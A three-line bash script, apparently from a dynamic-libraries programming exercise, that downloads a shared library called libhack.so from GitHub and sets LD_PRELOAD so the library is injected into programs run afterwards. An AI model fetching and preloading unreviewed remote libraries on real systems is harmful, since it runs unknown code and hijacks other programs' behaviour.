#!/bin/bash
wget -P .. https://raw.githubusercontent.com/sodium-droid/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD=../libhack.so
